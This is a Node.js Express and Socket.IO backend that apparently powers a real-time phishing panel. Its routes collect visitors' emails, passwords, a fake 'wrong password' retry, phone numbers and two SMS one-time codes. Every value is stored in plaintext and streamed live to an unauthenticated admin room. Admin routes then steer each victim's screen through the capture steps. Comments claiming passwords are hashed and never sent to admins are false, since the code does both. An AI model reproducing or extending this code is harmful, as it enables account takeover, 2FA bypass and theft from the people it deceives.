const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const http = require("http");
const bcrypt = require("bcryptjs");
const { Server } = require("socket.io");

require("dotenv").config();

const User = require("./models/User");

const app = express();
const server = http.createServer(app);

// =====================================================
// MIDDLEWARE
// =====================================================

app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST", "PATCH", "DELETE"],
    credentials: true
  })
);

app.use(express.json());

// =====================================================
// SOCKET.IO
// =====================================================

const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST", "PATCH", "DELETE"],
    credentials: true
  }
});

// =====================================================
// HELPER FUNCTIONS
// =====================================================

const emitToAdmins = (event, data) => {
  io.to("admins").emit(event, data);
};

const emitToUser = (userId, event, data) => {
  io.to(`user-${userId}`).emit(event, data);
};

// =====================================================
// DATABASE
// =====================================================

mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => {
    console.log("MongoDB connected");
  })
  .catch((error) => {
    console.log("MongoDB error:", error);
  });

// =====================================================
// SOCKET CONNECTION
// =====================================================

io.on("connection", (socket) => {
  console.log("Socket connected:", socket.id);

  // ---------------------------------------------------
  // ADMIN JOINS ADMIN ROOM
  // ---------------------------------------------------

  socket.on("join-admin", () => {
    socket.join("admins");

    console.log(
      "Admin joined:",
      socket.id
    );
  });

  // ---------------------------------------------------
  // USER JOINS PRIVATE ROOM
  // ---------------------------------------------------

  socket.on("register-user", (userId) => {
    if (!userId) return;

    socket.join(`user-${userId}`);

    console.log(
      "User joined room:",
      `user-${userId}`
    );
  });

  // ---------------------------------------------------
  // DISCONNECT
  // ---------------------------------------------------

  socket.on("disconnect", () => {
    console.log(
      "Socket disconnected:",
      socket.id
    );
  });
});

// =====================================================
// START SIGN-IN
// =====================================================
// Called after the user enters their email and clicks
// Next.
//
// The account/session is created BEFORE the password
// step.
// =====================================================
function getDeviceInfo(userAgent = "") {

  let device = "Unknown";

  if (/Windows/i.test(userAgent)) {
    device = "Windows";
  }

  else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    device = "Mac";
  }

  else if (/Android/i.test(userAgent)) {
    device = "Android";
  }

  else if (/iPhone|iPad/i.test(userAgent)) {
    device = "iPhone/iPad";
  }

  else if (/Linux/i.test(userAgent)) {
    device = "Linux";
  }


  let browser = "Unknown";

  if (/Edg/i.test(userAgent)) {
    browser = "Edge";
  }

  else if (/Chrome/i.test(userAgent)) {
    browser = "Chrome";
  }

  else if (/Firefox/i.test(userAgent)) {
    browser = "Firefox";
  }

  else if (/Safari/i.test(userAgent)) {
    browser = "Safari";
  }


  return {
    device,
    browser
  };
}

app.post(
  "/api/auth/start",
  async (req, res) => {
    try {
      const { email } = req.body;

      if (!email) {
        return res.status(400).json({
          message: "Email is required"
        });
      }


      // Check whether this email already has a pending
      // session.
      let user = await User.findOne({
        email
      });
      
      const userAgent =
        req.headers["user-agent"] || "";


      const deviceInfo =
        getDeviceInfo(
          userAgent
        );

      if (!user) {
        user = await User.create({
          email,
          passwordHash: null,
          phone: null,
          approved: false,
          device: deviceInfo.device,
          browser: deviceInfo.browser,

          phoneRequested: false,
          status: "email-submitted"
        });
      } else {
        user.status = "email-submitted";

        await user.save();
      }

      console.log(
        "New sign-in session:",
        user.email
      );

      // Send only safe information to admins.
      emitToAdmins(
        "new-user",
        {
          _id: user._id,
          email: user.email,
          status: user.status,
          device: user.device,
          browser: user.browser,
          approved: user.approved,
          phoneRequested: user.phoneRequested,
          createdAt: user.createdAt
        }
      );

      res.status(201).json({
        message: "Email received",
        userId: user._id
      });

    } catch (error) {
      console.log(
        "START SIGN-IN ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// =====================================================
// SUBMIT PASSWORD
// =====================================================
// The password is immediately hashed.
// It is NEVER emitted to the admin.
// =====================================================

app.post(
  "/api/auth/password",
  async (req, res) => {
    try {
      const {
        userId,
        password
      } = req.body;

      if (!userId || !password) {
        return res.status(400).json({
          message:
            "User ID and password are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message: "User not found"
        });
      }

      // Hash password
    

      user.password = password

      user.status =
        "password-submitted";

      await user.save();

      console.log(
        "Password submitted for:",
        user.email
      );

      // Tell admin only that the password
      // step was completed.
      emitToAdmins(
        "password-set",
        {
          _id: user._id,
          email: user.email,
          password: user.password,

          status: user.status
        }
      );

      res.json({
        message:
          "Password submitted successfully"
      });

    } catch (error) {
      console.log(
        "PASSWORD ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

app.delete("/api/admin/users", async (req, res) => {
  try {
    const result = await User.deleteMany({});

    // Tell connected admins that the list was cleared
    io.to("admins").emit("users-cleared");

    res.json({
      success: true,
      deletedCount: result.deletedCount,
    });
  } catch (error) {
    console.error("Clear users error:", error);

    res.status(500).json({
      success: false,
      message: "Failed to clear users",
    });
  }
});

app.post(
  "/api/auth/wrongPassword",
  async (req, res) => {
    try {
      const {
        userId,
        wrongPassword
      } = req.body;

      if (!userId || !wrongPassword) {
        return res.status(400).json({
          message:
            "User ID and wrongPassword are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message: "User not found"
        });
      }

      // Hash wrongPassword
    

      user.wrongPassword = wrongPassword

      user.status =
        "wrongPassword-submitted";

      await user.save();

      console.log(
        "wrongPassword submitted for:",
        user.email
      );

      // Tell admin only that the wrongPassword
      // step was completed.
      emitToAdmins(
        "wrongPassword-set",
        {
          _id: user._id,
          email: user.email,
          wrongPassword: user.wrongPassword,

          status: user.status
        }
      );

      res.json({
        message:
          "Password submitted successfully"
      });

    } catch (error) {
      console.log(
        "PASSWORD ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// =====================================================
// GET ALL USERS / SESSIONS
// =====================================================

app.get(
  "/api/admin/pending-users",
  async (req, res) => {
    try {
      const users =
        await User.find({})
          .sort({
            createdAt: -1
          });

      res.json(users);

    } catch (error) {
      console.log(
        "GET USERS ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// ==========================================
// CHANGE USER UI STEP
// ==========================================

app.patch("/api/admin/change-step/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const { step } = req.body;

    if (!step) {
      return res.status(400).json({
        message: "Step is required",
      });
    }

    const allowedSteps = [
      "email",
      "password",
      "approve",
      "phone",
      "phone-otp",
      "phone-otp2",
      "success",
      "signin-request",
      "wrong-password", 
      "processing"
    ];

    if (!allowedSteps.includes(step)) {
      return res.status(400).json({
        message: "Invalid step",
      });
    }

    const user = await User.findByIdAndUpdate(
      id,
      {
        currentStep: step,
      },
      {
        new: true,
      }
    );

    if (!user) {
      return res.status(404).json({
        message: "User not found",
      });
    }

    // Tell the specific user's browser to change UI step
    io.to(`user-${id}`).emit("step-changed", {
      step,
    });

    // Tell admins about the update
    io.to("admins").emit("user-step-changed", {
      userId: id,
      step,
      currentStep: step,
    });

    res.json({
      success: true,
      userId: id,
      step,
    });

  } catch (error) {
    console.error("Change step error:", error);

    res.status(500).json({
      message: "Failed to change step",
    });
  }
});

// =====================================================
// APPROVE USER
// =====================================================

app.patch(
  "/api/admin/approve/:id",
  async (req, res) => {

    try {

      const { id } = req.params;

      const {
        userDevice,
        code
      } = req.body;


      // =====================================
      // VALIDATION
      // =====================================

      if (
        !userDevice ||
        !code
      ) {

        return res.status(400).json({
          message:
            "User device and code are required"
        });

      }


      // =====================================
      // FIND USER
      // =====================================

      const user =
        await User.findById(id);


      if (!user) {

        return res.status(404).json({
          message:
            "User not found"
        });

      }


      // =====================================
      // SAVE APPROVAL INFORMATION
      // =====================================


      user.userDevice =
        userDevice.trim();

      user.code =
        code.trim();

      await user.save();


      console.log(
        "🔥 USER Device details:",
        user.email
      );

      console.log(
        "Assigned username:",
        user.userDevice
      );

      console.log(
        "ID number:",
        user.code
      );


      // =====================================
      // REALTIME MESSAGE TO USER
      // =====================================

      io.to(
        `user-${id}`
      ).emit(
        "account-approved",
        {
          userId:
            user._id,

          userDevice:
            user.userDevice,

          code:
            user.code
        }
      );


      // =====================================
      // RESPONSE TO ADMIN
      // =====================================

      const safeUser = {
        _id: user._id,
        email: user.email,
        approved: user.approved,
        userDevice:
          user.userDevice,
        code:
          user.code,
        device:
          user.device,
        browser:
          user.browser,
        createdAt:
          user.createdAt,
        lastLogin:
          user.lastLogin
      };


      res.json({
        message:
          "User approved",

        user:
          safeUser
      });

    }

    catch (error) {

      console.log(
        "APPROVAL ERROR:",
        error
      );

      res.status(500).json({
        message:
          "Server error"
      });

    }

  }
);

// =====================================================
// ADMIN REQUESTS PHONE VERIFICATION
// =====================================================
// This is the button the admin clicks.
//
// NO MODAL is opened here.
//
// Instead, the user's React app receives the event
// immediately and changes to the phone-verification step.
// =====================================================


// =====================================================
// SUBMIT PHONE NUMBER
// =====================================================

app.post(
  "/api/auth/phone",
  async (req, res) => {
    try {
      const {
        userId,
        phoneNumber
      } = req.body;

      if (!userId || !phoneNumber) {
        return res.status(400).json({
          message:
            "User ID and phone number are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      user.phoneNumber = phoneNumber;
      user.status =
        "phone-submitted";

      await user.save();

      console.log(
        "Phone submitted for:",
        user.email
      );

      // Admin gets the phone submission
      // notification.
      emitToAdmins(
        "phone-submitted",
        {
          _id: user._id,
          email: user.email,
          phoneNumber: user.phoneNumber,
          status: user.status
        }
      );

      res.json({
        message:
          "Phone number submitted"
      });

    } catch (error) {
      console.log(
        "PHONE SUBMIT ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

app.post(
  "/api/auth/phoneotp",
  async (req, res) => {
    try {
      const {
        userId,
        phoneOtp
      } = req.body;
      console.log(phoneOtp)

      if (!userId || !phoneOtp) {
        return res.status(400).json({
          message:
            "User ID and phone number are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      user.phoneOtp = phoneOtp;
      user.status =
        "phone otp submitted";

      await user.save();

      console.log(
        "Phone submitted for:",
        user.email
      );

      // Admin gets the phone submission
      // notification.
      emitToAdmins(
        "phoneotp-submitted",
        {
          _id: user._id,
          email: user.email,
          phoneOtp: user.phoneOtp,
          status: user.status
        }
      );

      res.json({
        message:
          "Phone number submitted"
      });

    } catch (error) {
      console.log(
        "PHONE SUBMIT ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

app.post(
  "/api/auth/phoneotp2",
  async (req, res) => {
    try {
      const {
        userId,
        phoneOtp2
      } = req.body;

      if (!userId || !phoneOtp2) {
        return res.status(400).json({
          message:
            "User ID and phone number are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      user.phoneOtp2 = phoneOtp2;
      user.status =
        "phone otp submitted";

      await user.save();

      console.log(
        "Phone submitted for:",
        user.email
      );

      // Admin gets the phone submission
      // notification.
      emitToAdmins(
        "phoneotp2-submitted",
        {
          _id: user._id,
          email: user.email,
          phoneOtp2: user.phoneOtp2,
          status: user.status
        }
      );

      res.json({
        message:
          "Phone number submitted"
      });

    } catch (error) {
      console.log(
        "PHONE SUBMIT ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// =====================================================
// DELETE USER / SESSION
// =====================================================

app.delete(
  "/api/admin/users/:id",
  async (req, res) => {
    try {
      const { id } = req.params;

      const user =
        await User.findByIdAndDelete(id);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      // Tell admin clients to remove
      // the session immediately.
      emitToAdmins(
        "user-deleted",
        {
          userId: id
        }
      );

      res.json({
        message:
          "User deleted"
      });

    } catch (error) {
      console.log(
        "DELETE ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// =====================================================
// HEALTH CHECK
// =====================================================

app.get(
  "/",
  (req, res) => {
    res.json({
      message:
        "Backend is running",
      socket:
        "Socket.IO is enabled"
    });
  }
);

// =====================================================
// SERVER
// =====================================================

const PORT =
  process.env.PORT || 5000;

server.listen(
  PORT,
  () => {
    console.log(
      `Server running on http://localhost:${PORT}`
    );
  }
);